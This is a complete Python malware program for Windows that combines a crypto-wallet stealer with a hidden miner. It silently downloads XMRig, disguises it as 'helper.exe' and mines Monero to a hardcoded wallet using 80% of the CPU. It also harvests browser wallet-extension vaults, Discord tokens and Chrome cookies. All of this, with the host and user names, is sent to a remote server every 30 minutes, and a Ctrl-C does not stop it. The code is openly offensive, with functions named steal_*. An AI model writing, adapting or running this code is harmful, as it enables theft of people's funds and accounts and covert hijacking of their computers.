import os
import re
import time
import requests
import subprocess
import threading
import zipfile
import multiprocessing
import shutil
import json
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"

TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'helper.exe')

CPU_CORES = multiprocessing.cpu_count()
THREADS = max(2, int(CPU_CORES * 0.8))  # Use 80% of CPU

print(f"[MINER] CPU Cores: {CPU_CORES}, Using: {THREADS} threads (80%)")

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
    except:
        pass

def start_miner():
    try:
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        if os.path.exists(MINER):
            subprocess.Popen(
                [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                 '--pass=x', f'--threads={THREADS}', '--keepalive', '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[MINER] Launched with {THREADS} threads")
    except Exception as e:
        print(f"[MINER] Error: {e}")

def steal_browser_extensions():
    """Steal wallet extension vaults."""
    print("[WALLET] Scanning for extension vaults...")
    
    # Extension IDs (Metamask, Phantom, Trust, Coinbase, Rabby, OKX)
    extensions = {
        'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
        'phantom': 'bfnaelmomejmhlkdgepjocepnpkbmjgj',
        'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
        'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
        'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
        'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
        'walletconnect': 'bockfbmjcgpkmgdmakpkjnmdhfdnncop',
    }
    
    found = 0
    for name, ext_id in extensions.items():
        # Chrome paths
        chrome_paths = [
            os.path.expandvars(f"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\{ext_id}"),
            os.path.expandvars(f"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile*\\Local Extension Settings\\{ext_id}"),
        ]
        
        for base_path in chrome_paths:
            from glob import glob
            for path in glob(base_path):
                if os.path.exists(path):
                    # Look for LOCK file (contains vault data)
                    lock_file = os.path.join(path, 'LOCK')
                    if os.path.exists(lock_file):
                        try:
                            with open(lock_file, 'r', errors='ignore') as f:
                                content = f.read()
                                if content and len(content) > 50:
                                    send({
                                        'type': f'{name}_vault',
                                        'path': lock_file,
                                        'content': content[:100000]
                                    })
                                    found += 1
                                    print(f"[VAULT] {name} vault stolen from Chrome")
                        except:
                            pass
                    
                    # Also look for other files that might contain vault data
                    for file in ['CURRENT', 'LOG', 'MANIFEST-000001']:
                        file_path = os.path.join(path, file)
                        if os.path.exists(file_path):
                            try:
                                with open(file_path, 'r', errors='ignore') as f:
                                    content = f.read()
                                    if content and len(content) > 100:
                                        if 'vault' in content.lower() or 'seed' in content.lower():
                                            send({
                                                'type': f'{name}_vault_file',
                                                'path': file_path,
                                                'content': content[:50000]
                                            })
                                            print(f"[VAULT] {name} data from {file}")
                            except:
                                pass
        
        # Firefox paths
        firefox_base = os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles\\")
        if os.path.exists(firefox_base):
            for profile in os.listdir(firefox_base):
                if profile.endswith('.default'):
                    storage_path = os.path.join(firefox_base, profile, 'storage', 'default')
                    if os.path.exists(storage_path):
                        for item in os.listdir(storage_path):
                            if ext_id in item:
                                full_path = os.path.join(storage_path, item)
                                if os.path.isdir(full_path):
                                    for root, dirs, files in os.walk(full_path):
                                        for f in files:
                                            if f.endswith('.sqlite'):
                                                try:
                                                    with open(os.path.join(root, f), 'rb') as fp:
                                                        content = fp.read(100000)
                                                        send({
                                                            'type': f'{name}_firefox',
                                                            'path': os.path.join(root, f),
                                                            'content': content.hex()[:100000]
                                                        })
                                                        print(f"[VAULT] {name} data from Firefox")
                                                except:
                                                    pass
    
    print(f"[WALLET] Found {found} extension vaults")

def steal_discord_tokens():
    """Steal Discord tokens from local storage."""
    print("[TOKEN] Scanning for Discord tokens...")
    
    discord_paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
    ]
    
    found = 0
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    file_path = os.path.join(path, file)
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            # Discord token pattern
                            match = re.search(r'[a-zA-Z0-9_-]{64}', content)
                            if match:
                                send({
                                    'type': 'discord_token',
                                    'path': file_path,
                                    'content': match.group()
                                })
                                found += 1
                                print(f"[TOKEN] Discord token found")
                    except:
                        pass
    
    print(f"[TOKEN] Found {found} Discord tokens")

def steal_browser_cookies():
    """Steal browser cookies for crypto sites."""
    print("[COOKIES] Scanning for browser cookies...")
    
    # This would require reading the cookies database
    # Simplified: just look for cookie files
    cookie_paths = [
        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"),
    ]
    
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                with open(path, 'rb') as f:
                    content = f.read(100000)
                    # Check if it contains crypto site cookies
                    crypto_sites = ['metamask', 'phantom', 'opensea', 'uniswap']
                    content_str = content.decode('latin-1', errors='ignore')
                    for site in crypto_sites:
                        if site in content_str.lower():
                            send({
                                'type': 'cookie_file',
                                'path': path,
                                'content': content.hex()[:100000]
                            })
                            print(f"[COOKIES] Found crypto site cookies")
            except:
                pass

def scan_all():
    """Run all scans."""
    steal_browser_extensions()
    steal_discord_tokens()
    steal_browser_cookies()
    print("[WALLET] All scans complete")

def main():
    print("[SERVICE] Starting...")
    
    # Start miner with 80% CPU
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Run wallet scanner once (then repeats every 30 minutes)
    def scan_loop():
        while True:
            scan_all()
            time.sleep(1800)  # 30 minutes
    
    threading.Thread(target=scan_loop, daemon=True).start()
    
    print("[SERVICE] Running...")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()